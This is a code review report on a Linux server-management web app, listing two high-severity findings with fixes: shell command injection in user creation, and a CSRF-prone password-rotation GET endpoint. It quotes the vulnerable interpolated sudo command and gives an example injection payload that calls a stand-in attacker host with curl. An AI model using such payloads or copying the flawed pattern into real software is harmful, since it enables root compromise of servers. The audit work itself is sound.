# Code review follow-up 4

## Finding 1: Remote command injection when creating users
- Severity: high
- Confidence: high

### Where
- `LinuxPass/Services/AddUserService.cs:25`

### Why this is a problem
`AddUserService.AddUser` builds a shell command by interpolating the untrusted `username` and generated `password` directly into a string passed to `client.CreateCommand(...)`.

```csharp
var command = client.CreateCommand($"sudo useradd -m {username} && echo '{username}:{password}' | sudo chpasswd");
```

`username` comes from the HTTP POST body in `PasswordsController.Create`, so any authenticated user who can reach that form can inject shell metacharacters. Because the command is executed through SSH with sudo privileges, a crafted username can execute arbitrary commands on the managed server as root.

A payload such as `test; curl attacker/... #` or one containing command substitution would be executed before `useradd`/`chpasswd` complete.

### Impact
This is a direct authenticated remote code execution path on every onboarded server. An attacker can create backdoor users, modify sudoers, exfiltrate keys, or take full control of managed hosts.

### Recommendation
Do not concatenate shell commands with user-controlled data. Strictly validate usernames against a safe allowlist (for example Linux account naming rules), and pass arguments through an escaping routine or avoid shell parsing entirely.

## Finding 2: Password rotation is exposed as a CSRFable GET action
- Severity: high
- Confidence: high

### Where
- `LinuxPass/Controllers/ServersController.cs:208`
- `LinuxPass/Views/Servers/Index.cshtml:70`

### Why this is a problem
`ServersController.Rotate` changes state by rotating passwords for all eligible accounts on the target server, but it is exposed as a plain GET endpoint and the UI triggers it through an `<a>` link:

```csharp
public async Task<IActionResult> Rotate(int id)
```

```html
<a asp-action="Rotate" asp-route-id="@item.Id" class="btn btn-outline-success btn-sm">
```

Because no POST verb or antiforgery token is required, any external page can trigger this action by embedding a link, image, iframe, or automatic navigation to `/Servers/Rotate/{id}` while a victim is authenticated. Browsers will include the victim's auth cookies on that same-site request.

### Impact
An attacker can force administrators to rotate passwords unexpectedly, causing denial of service for legitimate users and potentially disrupting operational access across managed servers.

### Recommendation
Make `Rotate` a POST-only action protected by `[ValidateAntiForgeryToken]`, and invoke it from a form submission rather than a link. Restrict state-changing operations to non-GET verbs throughout the application.
